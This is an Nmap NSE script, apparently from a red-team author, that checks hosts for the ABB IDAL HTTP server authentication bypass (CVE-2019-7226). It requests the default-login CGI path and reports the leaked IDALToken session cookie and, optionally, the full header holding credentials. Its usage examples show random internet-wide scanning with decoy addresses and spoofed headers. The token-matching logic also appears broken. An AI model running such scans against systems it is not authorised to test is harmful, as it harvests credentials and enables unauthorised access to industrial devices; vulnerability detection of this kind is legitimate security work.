---
-- Nmap NSE ABB-CVE-2019-7226.nse - Version 1.3
-- Copy to: /usr/share/nmap/scripts/ABB-CVE-2019-7226.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help ABB-CVE-2019-7226.nse
-- Port(s) accepted by this nse: 80-86,443,8001,8080-8086
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it
NSE script to detect if target [ip]:[port][/url] its affected by CVE-2019-7226 (Improper Authentication)
The ABB IDAL HTTP server CGI interface contains a URL that allows an unauthenticated attacker to bypass authentication
and gain access to privileged functions. Specifically, /cgi/loginDefaultUser creates a session in an authenticated state
and returns the session ID along with what may be the username and cleartext password of the user. An attacker can then
supply an IDALToken value in a cookie, which will allow them to perform privileged operations such as restarting the service
with /cgi/restart.

Some Syntax examples:
nmap --script-help ABB-CVE-2019-7226.nse
nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script ABB-CVE-2019-7226.nse 223.7.230.27
nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "uri=/css" 223.7.230.27
nmap -sS -Pn -p 80 --open --script ABB-CVE-2019-7226.nse --script-args "agent=Apache-HttpClient/4.0.3,verbose=true" 80.32.135.112
nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,443,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help ABB-CVE-2019-7226.nse
-- nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script ABB-CVE-2019-7226.nse 223.7.230.27
-- nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "uri=/css" 223.7.230.27
-- nmap -sS -Pn -p 80 --open --script ABB-CVE-2019-7226.nse --script-args "agent=Apache-HttpClient/4.0.3,verbose=true" 80.32.135.112
-- nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,443,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 81/tcp open  http
-- | ABB-CVE-2019-7226:
-- |   State: VULNERABLE
-- |   Title: ABB IDAL HTTP server CGI (Improper Authentication)
-- |    Auth-Cookie: IDALToken=532c8632b86694f0232a68a0897a145c
-- |    Vulnerable : http://223.7.230.27:81/cgi/loginDefaultUser
-- |
-- |      Description: The ABB IDAL HTTP server CGI interface contains a URL that allows an unauthenticated attacker
-- |      to bypass authentication and gain access to privileged functions. Specifically, /cgi/loginDefaultUser creates
-- |      a session in an authenticated state and returns the session ID along with what may be the username and cleartext
-- |      password of the user. An attacker can then supply an IDALToken value in a cookie, which will allow them to perform
-- |      privileged operations such as restarting the service with /cgi/restart. A GET request to /cgi/loginDefaultUser may
-- |      result in '1 #S_OK IDALToken=532c8632b86694f0232a68a0897a145c admin admin' or a similar response.
-- |
-- |     References:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-7226
-- |     https://www.akaoma.com/ressources/cve/gain-privilege/cve-2019-7226
-- |     https://packetstormsecurity.com/files/153402/ABB-IDAL-HTTP-Server-Authentication-Bypass.html
-- |_
-- @args payload.uri the path name to search. Default: /cgi/loginDefaultUser
-- @args payload.agent User-agent to send in request - Default: iPhone,safari
-- @args payload.verbose Automatic display target webpage body - Default: false
---


author = "r00t-3xp10it (ssa redteam)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "default"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local stdnse = require ('stdnse') --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 81, 82, 83, 84, 85, 86, 443, 8080, 8081, 8082, 8083, 8084, 8085, 8086}, "http, https, http-proxy", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/cgi/loginDefaultUser"


-- Manipulate TCP packet 'header' with false information about attacker :D
local _decoy = {header={}}   --> manipulate 'header' request ..
_decoy['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" --> use iPhone,safari User-agent OR your own...
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
_decoy['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)


local response = http.get(host, port, uri, _decoy)
-- PRODUCES FALSE POSITIVES FOR DEBUG USING: 223.7.230.27:80/css --
-- Capture/Match server name from header {table.insert}
--server_name = "Microsoft-IIS/6.0"
--for _, server_version in pairs(response.rawheader) do
--   if (verbose == "true") then
--      print(server_version)
--   end
--   if (server_version == server_name) then
--      server_name = server_version
--      break
--   end
--end

-- PRODUCES FALSE POSITIVES FOR DEBUG USING: 223.7.230.27:80/css --
--cookie_name = "IDALToken=532c8632b86694f0232a68a0897a145cs"
--if string.find(cookie_name, "IDALToken=") then
--   grab_cookie = cookie_name
--   uri = "/cgi/loginDefaultUser"
--else
--   grab_cookie = "false"
--end

-- Make sure auth cookie['Name'] exists in response.rawheader {table}
-- Condition that show us that Server its leaking creds (auth cookie).
grab_cookie = "false"
for _, grab_cookie in pairs(response.rawheader) do
   if (grab_cookie:match("IDALToken=")) then
      grab_cookie = cookie_name
      break
   end
end
   

-- Build stdout displays {table.insert}
local not_vuln = "State: NOT VULNERABLE\nTitle: ABB IDAL HTTP server CGI (Improper Authentication)\n\n"
local vuln_description = "The ABB IDAL HTTP server CGI interface contains a URL that allows an unauthenticated attacker\n   to bypass authentication and gain access to privileged functions. Specifically, /cgi/loginDefaultUser creates\n   a session in an authenticated state and returns the session ID along with what may be the username and cleartext\n   password of the user. An attacker can then supply an IDALToken value in a cookie, which will allow them to perform\n   privileged operations such as restarting the service with /cgi/restart. A GET request to /cgi/loginDefaultUser may\n   result in '1 #S_OK IDALToken=532c8632b86694f0232a68a0897a145c admin admin' or a similar response.\n\n  References:\n  https://nvd.nist.gov/vuln/detail/CVE-2019-7226\n  https://www.akaoma.com/ressources/cve/gain-privilege/cve-2019-7226\n  https://packetstormsecurity.com/files/153402/ABB-IDAL-HTTP-Server-Authentication-Bypass.html\n\n"


   local out = {}
   -- Build stdout displays {table.insert}
   if (grab_cookie ~= "false" and response.status == 200) then
   -- if (grab_cookie ~= "false" and response.status == 403) then --> PRODUCES FALSE POSITIVES FOR DEBUG USING: 223.7.230.27:80/css
      table.insert(out, string.format("State: VULNERABLE\n"))
      table.insert(out, string.format("Title: ABB IDAL HTTP server CGI (Improper Authentication)\n"))
      table.insert(out, string.format(" Auth-Cookie: "..grab_cookie.."\n"))
      table.insert(out, string.format(" Vulnerable : http://"..host.ip..":"..port.number..uri.."\n\n"))
      table.insert(out, string.format("   Description: %s", vuln_description))
      -- Display full header if "verbose=true"
      if (verbose == "true") then
      table.insert(out, string.format("\n[ Leaked Header ]\n"))
         -- Display captured header containing cookie_value and leaked creds
         for _, stdout_header in pairs(response.rawheader) do
            table.insert(out, stdout_header)
         end
      end
      -- Display table (stdout)
      return stdnse.format_output(true, out)
   else
      -- Display table (stdout)
      table.insert(out, not_vuln)
      return stdnse.format_output(true, out)
    end
end
